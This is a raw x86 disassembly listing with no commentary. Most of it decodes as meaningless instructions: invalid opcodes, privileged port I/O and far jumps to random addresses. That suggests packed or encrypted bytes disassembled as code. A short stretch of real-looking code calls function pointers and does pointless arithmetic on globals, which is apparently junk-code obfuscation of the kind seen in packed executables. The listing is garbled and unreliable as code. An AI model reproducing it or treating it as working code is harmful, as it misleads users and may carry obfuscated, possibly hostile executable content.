  41e6de:	shr    BYTE PTR [edx+ebx*8-0x3af50f41],cl
  41e6e5:	dec    edi
  41e6e6:	pop    ds
  41e6e7:	dec    edx
  41e6e8:	add    esi,DWORD PTR [ecx]
  41e6ea:	sar    DWORD PTR [edx-0x2b66b26a],0x41
  41e6f1:	hlt    
  41e6f2:	cli    
  41e6f3:	addr16 or al,0x78
  41e6f6:	add    eax,0x248cf4f0
  41e6fb:	cs cwde 
  41e6fd:	retf   0xd417
  41e700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e701:	xlat   BYTE PTR ds:[ebx]
  41e702:	fisubr WORD PTR [ecx+0x21]
  41e705:	sub    DWORD PTR [esi-0x7568f5ff],ebp
  41e70b:	xchg   ebx,eax
  41e70c:	outs   dx,DWORD PTR ds:[esi]
  41e70d:	inc    ebx
  41e70e:	ror    BYTE PTR [ebx-0x13],cl
  41e711:	cmp    al,0x42
  41e713:	push   edi
  41e714:	(bad)  
  41e715:	in     al,0x1a
  41e717:	mov    cl,0xd3
  41e719:	(bad)  
  41e71a:	push   ss
  41e71b:	lahf   
  41e71c:	push   ds
  41e71d:	and    bh,ah
  41e71f:	jne    0x41e6ec
  41e721:	data16 xchg BYTE PTR [eax],dh
  41e724:	in     eax,dx
  41e725:	cmp    DWORD PTR [ebp+0x6d],0xffffffaf
  41e729:	mov    al,ds:0xde711a88
  41e72e:	bound  eax,QWORD PTR [ebx+0x495e5810]
  41e734:	fdiv   QWORD PTR [edi+ebp*1+0x27]
  41e738:	adc    BYTE PTR [esi+0x1],ah
  41e73b:	nop
  41e73c:	mov    esi,0x1154ae85
  41e741:	test   eax,0xcfc0bc02
  41e746:	stc    
  41e747:	cmc    
  41e748:	(bad)  
  41e749:	sbb    eax,0x83fd004a
  41e74e:	sub    edx,esi
  41e750:	mov    BYTE PTR [edi+0x6c431e31],dh
  41e756:	dec    edi
  41e757:	sahf   
  41e758:	mov    di,0x2a1d
  41e75c:	arpl   WORD PTR [esi+0x53e01f2a],ax
  41e762:	shl    bh,cl
  41e764:	xchg   BYTE PTR [eax-0x43],al
  41e767:	sbb    ch,BYTE PTR [esi+0x6b51cec8]
  41e76d:	(bad)  
  41e76e:	sbb    ebp,DWORD PTR [esi+0x35cd4614]
  41e774:	dec    esp
  41e775:	xor    eax,0x9f6770c4
  41e77a:	push   es
  41e77b:	jge    0x41e6ff
  41e77d:	sbb    DWORD PTR [edx+0x4548a8d3],edi
  41e783:	fwait
  41e784:	cld    
  41e785:	push   edi
  41e786:	add    eax,0x5c946236
  41e78b:	mov    ecx,0xb835fd08
  41e790:	mov    al,0xa7
  41e792:	daa    
  41e793:	loopne 0x41e7ee
  41e795:	add    eax,0x2d22daaa
  41e79a:	jbe    0x41e7da
  41e79c:	pop    ss
  41e79d:	mov    DWORD PTR [esi],edx
  41e79f:	or     al,BYTE PTR [esp+edx*4-0x73]
  41e7a3:	repnz push edx
  41e7a5:	jb     0x41e7e4
  41e7a7:	add    BYTE PTR [ecx-0x64],ch
  41e7aa:	add    edx,DWORD PTR [ebp-0x3a]
  41e7ad:	xchg   edi,eax
  41e7ae:	lahf   
  41e7af:	loop   0x41e7af
  41e7b1:	xor    esp,ebp
  41e7b3:	dec    eax
  41e7b4:	cmp    ah,BYTE PTR [esi]
  41e7b6:	retf   
  41e7b7:	pop    ds
  41e7b8:	rcr    edx,cl
  41e7ba:	call   0x71e6bfb6
  41e7bf:	dec    edi
  41e7c0:	and    ch,BYTE PTR [esp+ebx*4-0x29]
  41e7c4:	adc    DWORD PTR [eax+0x66],0xfffffff9
  41e7c8:	ins    BYTE PTR es:[edi],dx
  41e7c9:	punpckhbw mm5,mm2
  41e7cc:	or     al,0x71
  41e7ce:	stos   DWORD PTR es:[edi],eax
  41e7cf:	mov    dl,0xae
  41e7d1:	retf   
  41e7d2:	shl    DWORD PTR [ebx+ebx*2-0x6f04d903],0xfb
  41e7da:	sbb    bl,BYTE PTR [ecx]
  41e7dc:	pushf  
  41e7dd:	push   esi
  41e7de:	icebp  
  41e7df:	sub    ebx,DWORD PTR [ebx+0x40]
  41e7e2:	pop    ebp
  41e7e3:	(bad)  
  41e7e5:	jbe    0x41e7a4
  41e7e7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7e9:	push   ds
  41e7ea:	dec    ebp
  41e7eb:	cmp    bl,BYTE PTR [ebp+0x63]
  41e7ee:	stc    
  41e7ef:	and    eax,0x95a70818
  41e7f4:	lock sbb al,0xff
  41e7f7:	push   edx
  41e7f8:	mov    BYTE PTR [ebp+eiz*2-0x30],bh
  41e7fc:	mov    esp,0xa3028c0a
  41e801:	stc    
  41e802:	out    dx,al
  41e803:	mov    fs,WORD PTR [ebp+0x7a25193e]
  41e809:	xchg   edx,eax
  41e80a:	fidivr DWORD PTR [esi-0x75e69288]
  41e810:	mov    DWORD PTR [edi+0x33],0x39da892a
  41e817:	test   bh,ch
  41e819:	ins    DWORD PTR es:[edi],dx
  41e81a:	mov    eax,ds:0x71e3cdfe
  41e81f:	jp     0x24a52057
  41e825:	xor    al,0xd7
  41e827:	pusha  
  41e828:	dec    ebx
  41e829:	or     DWORD PTR fs:[ebx+0xd],eax
  41e82d:	mov    edx,0x44bdf578
  41e832:	mov    ch,0x5e
  41e834:	jo     0x41e807
  41e836:	loope  0x41e83b
  41e838:	aas    
  41e839:	in     eax,dx
  41e83a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e83b:	imul   edx
  41e83d:	and    esi,DWORD PTR [edx-0x74]
  41e840:	jle    0x41e85b
  41e842:	push   ecx
  41e843:	mov    ecx,0x27deb36e
  41e848:	jae    0x41e82b
  41e84a:	mov    ah,0x32
  41e84c:	mov    BYTE PTR [eax+esi*2],al
  41e84f:	pop    ebx
  41e850:	aad    0x91
  41e852:	cli    
  41e853:	neg    dl
  41e855:	stos   BYTE PTR es:[edi],al
  41e856:	fild   WORD PTR [edx-0x48]
  41e859:	inc    esi
  41e85a:	cmp    al,0x90
  41e85c:	int    0x62
  41e85e:	in     eax,0xb7
  41e860:	je     0x41e825
  41e862:	mov    WORD PTR [ecx+0x3b046520],cs
  41e868:	in     eax,dx
  41e869:	mov    cl,0x40
  41e86b:	test   esp,esp
  41e86d:	pop    ss
  41e86e:	mov    bl,0x9d
  41e870:	lds    ebp,FWORD PTR [eax-0x5652b008]
  41e876:	jae    0x41e8bc
  41e878:	gs and eax,edx
  41e87b:	dec    ebx
  41e87c:	lods   eax,DWORD PTR ds:[esi]
  41e87d:	call   0x4d9caac6
  41e882:	jne    0x41e8b7
  41e884:	div    BYTE PTR [ebp+ebp*2+0x0]
  41e888:	mov    edi,edx
  41e88a:	and    DWORD PTR [eax],edx
  41e88c:	pop    es
  41e88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e88e:	stos   DWORD PTR es:[edi],eax
  41e88f:	mov    edi,0xef3e3b52
  41e894:	repnz cmp al,0x69
  41e897:	hlt    
  41e898:	add    BYTE PTR ds:[edi+ebp*4-0x291b3171],al
  41e8a0:	sbb    eax,0xf78b7e09
  41e8a5:	mov    edi,DWORD PTR [eax+0x35885ea3]
  41e8ab:	aam    0x6d
  41e8ad:	adc    eax,0xdceb82c3
  41e8b2:	push   es
  41e8b3:	jecxz  0x41e8ee
  41e8b5:	rol    DWORD PTR [ebp-0x594f6ee0],0x31
  41e8bc:	(bad)  
  41e8bd:	mov    eax,0x5b77eef6
  41e8c2:	in     al,0x67
  41e8c4:	fild   WORD PTR [edi+0x3b0af2a8]
  41e8ca:	arpl   WORD PTR [ebp+0x113bed94],si
  41e8d0:	ret    
  41e8d1:	call   0xe88d:0xb8a9b2c
  41e8d8:	cwde   
  41e8d9:	push   cs
  41e8da:	lds    edi,FWORD PTR [edx]
  41e8dc:	int    0x80
  41e8de:	fisubr DWORD PTR [edx]
  41e8e0:	(bad)  
  41e8e1:	fwait
  41e8e2:	outs   dx,BYTE PTR ds:[esi]
  41e8e3:	jmp    0x32d5:0x2c174444
  41e8ea:	sbb    eax,DWORD PTR [esi+0x232170a8]
  41e8f0:	mov    dl,0xc
  41e8f2:	cmp    edi,DWORD PTR [ebx-0x61]
  41e8f5:	adc    eax,0x8020735a
  41e8fa:	and    DWORD PTR [ecx+0x19],ebx
  41e8fd:	mov    al,0x4d
  41e8ff:	call   0xbed77ea0
  41e904:	xor    edi,DWORD PTR [ebx]
  41e906:	test   ebx,ecx
  41e908:	jb     0x41e94a
  41e90a:	iret   
  41e90b:	mov    eax,DWORD PTR [esi+0x7f]
  41e90e:	mov    edx,0x8b7b8a65
  41e913:	lods   al,BYTE PTR ds:[esi]
  41e914:	es inc esp
  41e916:	xor    eax,0x73781c14
  41e91b:	jnp    0x41e8b1
  41e91d:	aaa    
  41e91e:	mov    cl,0x87
  41e920:	mov    ebx,0x6f8e3c42
  41e925:	std    
  41e926:	xchg   DWORD PTR [ebx+0x5c23b1cb],ebp
  41e92c:	xchg   eax,edx
  41e92e:	pop    ds
  41e92f:	mov    edi,0x84cbfa9d
  41e934:	sahf   
  41e935:	push   eax
  41e936:	jmp    0x41e971
  41e938:	icebp  
  41e939:	in     eax,0x36
  41e93b:	mov    cl,0x1e
  41e93d:	xor    DWORD PTR ds:0xae1eb22c,edx
  41e943:	sbb    esi,ebp
  41e945:	bound  eax,QWORD PTR [eax]
  41e947:	push   es
  41e948:	mov    ecx,ebx
  41e94a:	fild   QWORD PTR [ecx+0x43]
  41e94d:	pushf  
  41e94e:	dec    ecx
  41e94f:	mov    bl,0x1d
  41e951:	jmp    0x4419:0x7cba293a
  41e958:	add    ebp,DWORD PTR [ecx+0x3b]
  41e95b:	push   esp
  41e95c:	or     BYTE PTR [eax],bl
  41e95e:	sub    al,BYTE PTR [ecx]
  41e960:	into   
  41e961:	fnstenv [ebx+edx*2+0x19fdc3b8]
  41e968:	push   edx
  41e969:	add    al,0xf
  41e96b:	(bad)  
  41e96c:	ror    DWORD PTR [ebx-0x14],cl
  41e96f:	push   0x30
  41e971:	mov    edi,0xec77c13d
  41e976:	xlat   BYTE PTR ds:[ebx]
  41e977:	daa    
  41e978:	loop   0x41e8ff
  41e97a:	push   esi
  41e97b:	enter  0x5330,0x64
  41e97f:	arpl   WORD PTR [ebx-0x28f4b4bd],ax
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x4226a8
  41e9a9:	push   DWORD PTR ds:0x42243c
  41e9af:	mov    eax,ds:0x4225b8
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x4225b8
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x4225b8
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x4282c7,0x0
  41ea0c:	mov    DWORD PTR ds:0x4283d3,0x7749
  41ea16:	mov    DWORD PTR ds:0x4281d3,ebx
  41ea1c:	mov    DWORD PTR ds:0x428373,edx
  41ea22:	mov    DWORD PTR ds:0x428373,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x4282eb,edx
  41ea37:	cmp    DWORD PTR ds:0x4282c7,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e74
  41ea54:	sbb    DWORD PTR ds:0x4283cf,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42837b
  41ea60:	xor    ecx,DWORD PTR ds:0x428367
  41ea66:	mov    DWORD PTR ds:0x42837b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x4282a3,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x4281f7
  41ea80:	mov    ecx,DWORD PTR ds:0x428243
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x4281e7,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x428257
  41ea95:	mov    eax,ds:0x428343
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x4282bb,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x4282eb,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42837b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x4283f7,0x42834f
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x4283e3,0x4283f3
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428363
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x4282bb,0x4281ef
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x428407,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428387,0x0
  41eb42:	mov    DWORD PTR ds:0x4283f7,edx
  41eb48:	mov    DWORD PTR ds:0x428297,ebx
  41eb4e:	not    DWORD PTR ds:0x428293
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42828b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428377
  41eb69:	cmp    DWORD PTR ds:0x428387,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e78
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x4283ef
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x4283f7,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42828f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x428323
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x4283f3,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x4281bb,0x428307
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x4282af,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0xbb
  41ec04:	sbb    dh,dl
  41ec06:	push   0xe
  41ec08:	das    
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx-0x9e7e7ee],ah
  41ec10:	push   ebp
  41ec11:	xchg   DWORD PTR [eax],ebp
  41ec13:	or     esi,esi
  41ec15:	hlt    
  41ec16:	pop    es
  41ec17:	call   edx
  41ec19:	pop    es
  41ec1a:	(bad)
  41ec1d:	xchg   esi,eax
  41ec1e:	jae    0x41ec7f
  41ec20:	add    esp,DWORD PTR [ebx]
  41ec22:	test   al,0xfb
  41ec24:	pop    edx
  41ec25:	jmp    0xf4f19878
  41ec2a:	aam    0x70
  41ec2c:	js     0x41ec5a
  41ec2e:	xor    BYTE PTR [ebp-0x33],bl
  41ec31:	rcl    DWORD PTR [ebp+0x2c],0xb8
  41ec35:	xchg   ebp,eax
  41ec36:	mov    ah,0x98
  41ec38:	or     eax,0xf549619e
  41ec3d:	fcmovb st,st(0)
  41ec3f:	inc    eax
  41ec40:	pop    esp
  41ec41:	icebp  
  41ec42:	sbb    al,0x20
  41ec44:	loop   0x41ebe2
  41ec46:	jp     0x41ec5d
  41ec48:	mov    esi,0x760f4fda
  41ec4d:	or     DWORD PTR [ebx+0x23ae79bd],eax
  41ec53:	mov    eax,ds:0x655b8bc1
  41ec58:	mov    ah,0x43
  41ec5a:	xor    esp,DWORD PTR [eax-0x69]
  41ec5d:	or     eax,0x548eb850
  41ec62:	sub    DWORD PTR [esi-0x5b],ecx
  41ec65:	jge    0x41ec19
  41ec67:	pusha  
  41ec68:	hlt    
  41ec69:	cmp    BYTE PTR [edx-0x24ab78b7],bh
  41ec6f:	cmc    
  41ec70:	scas   eax,DWORD PTR es:[edi]
  41ec71:	pop    esp
  41ec72:	loope  0x41ebfe
  41ec74:	xchg   BYTE PTR [edi+edi*1],al
  41ec77:	lea    edi,[esi]
  41ec79:	cli    
  41ec7a:	arpl   WORD PTR [ecx-0xf],sp
  41ec7d:	in     al,0xaa
  41ec7f:	out    0x51,eax
  41ec81:	fisubr DWORD PTR [edi+0x7384a773]
  41ec87:	and    bh,BYTE PTR [edi+0x74]
  41ec8a:	sbb    al,0xd4
  41ec8c:	(bad)  
  41ec8d:	lods   eax,DWORD PTR ds:[esi]
  41ec8e:	aas    
  41ec8f:	imul   esp,esp,0xffffffe1
  41ec92:	stos   DWORD PTR es:[edi],eax
  41ec93:	xchg   esi,eax
  41ec94:	xor    bl,BYTE PTR [edi+0x70495ac3]
  41ec9a:	dec    ebp
  41ec9b:	sub    BYTE PTR [esi],dh
  41ec9d:	adc    DWORD PTR [ebp+0x56],ebx
  41eca0:	push   ebp
  41eca1:	pushf  
  41eca2:	fiadd  WORD PTR [eax]
  41eca4:	mov    dl,BYTE PTR [ebx-0x39427920]
  41ecaa:	leave  
  41ecab:	mov    eax,0xe27790f0
  41ecb0:	(bad)  
  41ecb1:	iret   
  41ecb2:	or     BYTE PTR [edi-0x55],al
  41ecb5:	shl    BYTE PTR [ebx-0x16],cl
  41ecb8:	scas   eax,DWORD PTR es:[edi]
  41ecb9:	xor    ecx,esp
  41ecbb:	and    al,0xd6
  41ecbd:	jmp    0x41ec90
  41ecbf:	add    eax,0x3215b731
  41ecc4:	mov    al,ds:0x6f22cf40
  41ecc9:	xchg   ebp,eax
  41ecca:	stos   BYTE PTR es:[edi],al
  41eccb:	icebp  
  41eccc:	pop    ebx
  41eccd:	pop    ds
  41ecce:	mov    eax,0x6b013b95
  41ecd3:	mov    ds:0xa968afc6,al
  41ecd8:	leave  
  41ecd9:	jle    0x41ed14
  41ecdb:	xchg   BYTE PTR [ebx-0x2ab655a9],bl
  41ece1:	adc    DWORD PTR [edi-0x349d434e],esi
  41ece7:	bound  ecx,QWORD PTR [esi]
  41ece9:	cdq    
  41ecea:	in     al,0x9d
  41ecec:	jge    0x41ecc8
  41ecee:	dec    edx
  41ecef:	(bad)  
  41ecf0:	sub    dh,BYTE PTR [ebx]
  41ecf2:	nop
  41ecf3:	inc    esi
  41ecf4:	xchg   DWORD PTR [esi-0xc44b42c],edi
  41ecfa:	and    eax,0x4f5fa1aa
  41ecff:	xchg   esi,eax
  41ed00:	or     eax,0x9af58c79
  41ed05:	daa    
  41ed06:	mov    ebx,0x5bd3be88
  41ed0b:	loopne 0x41ed71
  41ed0d:	jp     0x41ec90
  41ed0f:	adc    esp,DWORD PTR [eax]
  41ed11:	push   0x11
  41ed13:	dec    esp
  41ed14:	pop    edx
  41ed15:	inc    edx
  41ed16:	jle    0x41ed85
  41ed18:	rol    DWORD PTR [edi-0x254bda7b],0x73
  41ed1f:	or     dl,BYTE PTR ds:0x2c2b41d7
  41ed25:	loop   0x41ed46
  41ed27:	int    0xb8
  41ed29:	xchg   edi,eax
  41ed2a:	nop    DWORD PTR gs:[edi-0x7f]
  41ed2f:	mov    esi,0xbd9230b
  41ed35:	mov    ds:0x9e021e03,al
  41ed3a:	repnz leave 
  41ed3c:	loop   0x41ed45
  41ed3e:	mov    ebp,0x23670772
  41ed43:	mov    eax,ds:0xeac938c1
  41ed48:	cmp    dh,bh
  41ed4a:	mov    ecx,DWORD PTR [edi-0x73]
  41ed4d:	mov    esp,0xec137f37
  41ed52:	gs mov al,0x56
  41ed55:	mul    DWORD PTR [ebx+0x2f1e6bea]
  41ed5b:	mov    cl,0x7d
  41ed5d:	xor    eax,0x3eb8012c
  41ed62:	and    DWORD PTR [ecx-0x6bf60a8b],edi
  41ed68:	out    0xbc,eax
  41ed6a:	scas   eax,DWORD PTR es:[edi]
  41ed6b:	pop    ebx
  41ed6c:	dec    ebx
  41ed6d:	jmp    0x41ed17
  41ed6f:	cmp    ebx,DWORD PTR [ecx-0x2c]
  41ed72:	shl    DWORD PTR [ebx],cl
  41ed74:	sub    dh,dl
  41ed76:	jno    0x41ed9e
  41ed78:	jl     0x41ed5f
  41ed7a:	mov    esi,0x59154c8f
  41ed7f:	sbb    eax,0x504cb0b3
  41ed84:	shl    DWORD PTR [ecx+0xc],1
  41ed87:	cmp    bl,BYTE PTR [edx]
  41ed89:	jmp    0xec52e8eb
  41ed8e:	jmp    FWORD PTR [ebx-0x5ec77085]
  41ed94:	xchg   ebp,eax
  41ed95:	test   al,0x7
  41ed97:	adc    eax,0x4108844a
  41ed9c:	fisttp WORD PTR [ecx-0x3f]
  41ed9f:	add    BYTE PTR [edi-0x13],dl
  41eda2:	mov    bh,bh
  41eda4:	jecxz  0x41ed57
  41eda6:	scas   eax,DWORD PTR es:[edi]
  41eda7:	lds    ebx,FWORD PTR [edi-0x28]
  41edaa:	xor    dl,BYTE PTR [ecx]
  41edac:	xor    esi,DWORD PTR [edx-0x5c]
  41edaf:	dec    esi
  41edb0:	aaa    
  41edb1:	sub    ah,BYTE PTR [esi-0x16]
  41edb4:	loopne 0x41ee16
  41edb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb7:	dec    eax
  41edb8:	fdiv   QWORD PTR [esi]
  41edba:	jmp    0x41ed91
  41edbc:	(bad)  
  41edbd:	and    BYTE PTR [edi+0x55],ah
  41edc0:	fcomp  st(3)
  41edc2:	cld    
  41edc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edc4:	sar    BYTE PTR [ebx],0xa9
  41edc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edc8:	sbb    eax,0x59e5e0ed
  41edcd:	jge    0x41ee3c
  41edcf:	je     0x41ed62
  41edd1:	adc    BYTE PTR [ebx-0x70644582],dh
  41edd7:	jle    0x41ee43
  41edd9:	sub    BYTE PTR [esi-0x37dc2b79],dh
  41eddf:	mov    eax,ds:0x128ead0
  41ede4:	mov    dh,BYTE PTR [ecx+0x1f84636c]
  41edea:	test   BYTE PTR [edi+0x1e],0x2c
  41edee:	fst    QWORD PTR [eax]
  41edf0:	pushf  
  41edf1:	mov    dh,0x45
  41edf3:	lods   eax,DWORD PTR ds:[esi]
  41edf4:	and    BYTE PTR [edi+eax*2+0x5ab811e0],bl
  41edfb:	push   0x6b
  41edfd:	test   DWORD PTR [esi],ecx
  41edff:	sbb    ebx,DWORD PTR [edi]
  41ee01:	je     0x41ee6a
  41ee03:	push   ebp
  41ee04:	jno    0x41ee12
  41ee06:	and    cl,0xc4
  41ee09:	rol    DWORD PTR [edx],1
  41ee0b:	jg     0x41edfc
  41ee0d:	lods   eax,DWORD PTR ds:[esi]
  41ee0e:	jp     0x41ee79
  41ee10:	xchg   DWORD PTR [edi+0x0],ecx
  41ee13:	ret    0xfb33
  41ee16:	jmp    0x41ee21
  41ee18:	jae    0x41edb2
  41ee1a:	mov    BYTE PTR [edx-0x5a],ch
  41ee1d:	cld    
  41ee1e:	cmc    
  41ee1f:	loop   0x41eda9
  41ee21:	jno    0x41ee15
  41ee23:	nop
  41ee24:	xor    eax,0x599d9163
  41ee29:	bound  ebx,QWORD PTR [ecx-0x2660051b]
  41ee2f:	ds push edi
  41ee31:	shl    BYTE PTR [ecx-0x4e7facac],cl
  41ee37:	fs data16 sub al,0xfd
  41ee3b:	mov    edi,0xae56eb3b
  41ee40:	sbb    edi,esp
  41ee42:	add    eax,0x6bd78a04
  41ee47:	test   al,0xf3
  41ee49:	(bad)  
  41ee4a:	or     bh,dl
  41ee4c:	mov    al,BYTE PTR [ecx]
  41ee4e:	xor    DWORD PTR [ebx-0x796f1c58],esp
  41ee54:	lods   al,BYTE PTR ds:[esi]
  41ee55:	leave  
  41ee56:	sti    
  41ee57:	xor    BYTE PTR [esi],0x7e
  41ee5a:	ror    DWORD PTR [ebx],1
  41ee5c:	jb     0x41edf8
  41ee5e:	xchg   al,bh
  41ee60:	pusha  
  41ee61:	jne    0x41ee7b
  41ee63:	and    DWORD PTR [edi+ecx*1],esi
  41ee66:	ficomp DWORD PTR [edi-0x16]
  41ee69:	adc    eax,0x190d8725
  41ee6e:	or     eax,0xfcc14856
  41ee73:	int3   
  41ee74:	cmp    eax,0x2c23c24b
  41ee79:	jp     0x41ee36
  41ee7b:	leave  
  41ee7c:	clc    
  41ee7d:	xor    ah,BYTE PTR [edx]
  41ee7f:	adc    esi,DWORD PTR [ebx]
  41ee81:	cld    
  41ee82:	(bad)  
  41ee83:	sub    cl,ah
  41ee85:	les    ecx,FWORD PTR [ecx+0x13f34ee2]
  41ee8b:	mov    ds:0x244f48df,al
  41ee90:	in     al,0xf9
  41ee92:	retf   
  41ee93:	mov    dh,0x17
  41ee95:	jle    0x41eeaa
  41ee97:	repnz jmp 0x47f:0x5ba5d38a
  41ee9f:	lea    edi,[esi+edi*1+0x4a]
  41eea3:	inc    ebp
  41eea4:	inc    edx
  41eea5:	mov    eax,0x2e8f9464
  41eeaa:	enter  0x77e9,0x24
  41eeae:	inc    eax
  41eeaf:	icebp  
  41eeb0:	dec    ecx
  41eeb1:	ucomiss xmm0,DWORD PTR [edx]
  41eeb4:	gs popf 
  41eeb6:	push   ebp
  41eeb7:	add    al,BYTE PTR [edi+ecx*2]
  41eeba:	push   0x44
  41eebc:	retf   
  41eebd:	jl     0x41eefc
  41eebf:	fld    QWORD PTR ds:0x11497344
  41eec5:	xchg   BYTE PTR [edx],bl
  41eec7:	jg     0x41ef32
  41eec9:	loopne 0x41ef29
  41eecb:	inc    ecx
  41eecc:	sbb    edx,ebx
  41eece:	jl     0x41ef14
  41eed0:	mov    es,eax
  41eed2:	js     0x41eeb3
  41eed4:	gs (bad) 
  41eed6:	in     eax,0x72
  41eed8:	sub    DWORD PTR [edx+ebp*8],esi
  41eedb:	sub    edx,DWORD PTR [edx+0x78]
  41eede:	add    al,0x1c
  41eee0:	icebp  
  41eee1:	outs   dx,DWORD PTR ds:[esi]
  41eee2:	stc    
  41eee3:	pop    ds
  41eee4:	xchg   al,dh
  41eee6:	mov    eax,0x9e56d848
  41eeeb:	fnstcw WORD PTR [ecx+eiz*8+0x22dfcd51]
  41eef2:	adc    ebp,DWORD PTR [ebx-0x26b2ac05]
  41eef8:	ret    0x52db
  41eefb:	out    dx,eax
  41eefc:	retf   0xdcd0
  41eeff:	int3   
  41ef00:	pop    ecx
  41ef01:	pop    ss
  41ef02:	add    eax,0x713b9e62
  41ef07:	(bad)
  41ef0b:	sbb    ch,0x6d
  41ef0e:	fiadd  DWORD PTR [ebx+0x40b34056]
  41ef14:	(bad)  
  41ef15:	call   FWORD PTR [edx-0x38bdc40f]
  41ef1b:	and    edi,DWORD PTR [ebx-0x1]
  41ef1e:	pop    ecx
  41ef1f:	stos   BYTE PTR es:[edi],al
  41ef20:	add    esi,DWORD PTR [edi]
  41ef22:	or     eax,0x5573e91f
  41ef27:	inc    edi
  41ef28:	sub    edi,DWORD PTR [esi+0x35]
  41ef2b:	pop    eax
  41ef2c:	rcr    cl,0x39
  41ef2f:	push   eax
  41ef30:	cmp    al,0x27
  41ef33:	xor    BYTE PTR [ebx],cl
  41ef35:	xor    BYTE PTR [eax+0x50647726],0x4
  41ef3c:	mov    edi,0x54f77a5b
  41ef41:	adc    esi,esp
  41ef43:	add    eax,0xbd1d08c6
  41ef48:	mul    ebx
  41ef4a:	das    
  41ef4b:	fbld   TBYTE PTR [ecx+eiz*1-0x75]
  41ef4f:	inc    ebp
  41ef50:	mov    ah,0x81
  41ef52:	adc    eax,0x4281cf
  41ef57:	xchg   ebx,eax
